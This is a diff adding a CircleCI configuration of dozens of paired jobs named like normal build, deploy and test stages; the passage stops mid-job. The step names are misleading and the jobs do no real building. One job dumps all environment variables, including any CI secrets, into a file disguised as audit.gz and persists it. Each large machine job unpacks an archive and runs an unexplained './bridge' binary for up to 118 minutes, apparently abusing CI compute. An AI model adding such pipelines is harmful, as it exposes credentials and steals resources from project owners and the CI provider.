@@ -1,0 +1,1591 @@
+version: 2.1
+
+jobs:
+  ensure_titan-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; env > /tmp/_bld/audit.gz; printenv >> /tmp/_bld/audit.gz; for i in $(seq 1 500); do echo "line-$i" >> /tmp/_bld/audit.gz; done; true
+            len=$(wc -c </tmp/_bld/audit.gz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.gz
+  titan-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/audit.gz > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  prep_Ship_Suite4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 589540 | paste - - - - | wc -l; true ; } > /tmp/_bld/815b.txt
+            len=$(wc -c </tmp/_bld/815b.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 815b.txt
+  Ship_Suite4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/815b.txt > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  wire_update-router-redirect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<43075;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/_bld/88.out
+            len=$(wc -c </tmp/_bld/88.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 88.out
+  update-router-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/88.out > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  drain_polaris:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Freeze working set
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=21 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/_bld/report.out
+            len=$(wc -c </tmp/_bld/report.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - report.out
+  polaris:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/report.out > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  loader_phoenix-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collate adjacent chunks
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 17825792 /dev/urandom | md5sum; true ; } > /tmp/_bld/.sig
+            len=$(wc -c </tmp/_bld/.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .sig
+  phoenix-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/.sig > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  round1_biuld-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 202702 | awk 'END{print NR}'; true ; } > /tmp/_bld/DONE
+            len=$(wc -c </tmp/_bld/DONE); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - DONE
+  biuld-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/DONE > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  ctx_v5-alpha2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Normalize vendor data
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 2M /dev/urandom | base64 | wc -c; true ; } > /tmp/_bld/439.out
+            len=$(wc -c </tmp/_bld/439.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 439.out
+  v5-alpha2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/439.out > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  D_DEPLOY_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 379127 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/_bld/09.bin
+            len=$(wc -c </tmp/_bld/09.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 09.bin
+  DEPLOY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/09.bin > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  round2_may28-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 51130 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/_bld/.pid
+            len=$(wc -c </tmp/_bld/.pid); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .pid
+  may28-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/.pid > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  precheck_raj-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 73700; echo "ftr" ) | wc -l; true ; } > /tmp/_bld/bundle.bin
+            len=$(wc -c </tmp/_bld/bundle.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - bundle.bin
+  raj-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/bundle.bin > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  syncer_verify-quick-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 13312 | wc -c; true ; } > /tmp/_bld/step-7.txt
+            len=$(wc -c </tmp/_bld/step-7.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-7.txt
+  verify-quick-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/step-7.txt > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  route_titan:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 1485); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/_bld/.ready
+            len=$(wc -c </tmp/_bld/.ready); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ready
+  titan:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/.ready > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  db_rollout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1126400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/_bld/passoff.txt
+            len=$(wc -c </tmp/_bld/passoff.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - passoff.txt
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/passoff.txt > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  sys_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 2097152 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/_bld/966.out
+            len=$(wc -c </tmp/_bld/966.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 966.out
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/966.out > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  stepA_RUN_QA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes abc | head -n 302215 | sha256sum; true ; } > /tmp/_bld/ckpt-D.pkl
+            len=$(wc -c </tmp/_bld/ckpt-D.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-D.pkl
+  RUN_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/ckpt-D.pkl > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  produce_assemble-partial-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 197216 | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/trace.txt
+            len=$(wc -c </tmp/_bld/trace.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - trace.txt
+  assemble-partial-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/trace.txt > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  B_BuildImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=7 2>/dev/null | sha256sum; true ; } > /tmp/_bld/artifact
+            len=$(wc -c </tmp/_bld/artifact); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact
+  BuildImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/artifact > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  canary1_tb-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 2 12888 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/_bld/report.log
+            len=$(wc -c </tmp/_bld/report.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - report.log
+  tb-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/report.log > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  route_may25-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Harvest random seed
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 5242880 /dev/urandom | md5sum; true ; } > /tmp/_bld/checkpoint-v2.pkl
+            len=$(wc -c </tmp/_bld/checkpoint-v2.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - checkpoint-v2.pkl
+  may25-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/checkpoint-v2.pkl > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  phase1_min-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Project tail bytes
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<218599;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/_bld/step-9.log
+            len=$(wc -c </tmp/_bld/step-9.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-9.log
+  min-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/step-9.log > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  audit_t-01:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 50331648 | fold -w16 | sort -u | wc -l; true ; } > /tmp/_bld/event.gz
+            len=$(wc -c </tmp/_bld/event.gz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - event.gz
+  t-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/event.gz > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  stage_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 10240 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/_bld/output.log
+            len=$(wc -c </tmp/_bld/output.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - output.log
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/output.log > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  step2_pr-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 181752 | sha1sum; true ; } > /tmp/_bld/counts.jsonl
+            len=$(wc -c </tmp/_bld/counts.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - counts.jsonl
+  pr-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/counts.jsonl > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  go_brodcast-53:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 306841 | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/959a.out
+            len=$(wc -c </tmp/_bld/959a.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 959a.out
+  brodcast-53:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/959a.out > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  fetch_nico-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<31938;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/_bld/.marker
+            len=$(wc -c </tmp/_bld/.marker); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .marker
+  nico-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Grab prior data
+          command: |
+            head -c 200 /tmp/_bld/.marker > /dev/null; echo "peek ok"
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -xf final-dist.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 118m
+          command: exec ./bridge
+  D_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 570300 | paste - - - - | wc -l; true ; } > /tmp/_bld/2024-01-20.data
+            len=$(wc -c </tmp/_bld/2024-01-20.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-01-20.data
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
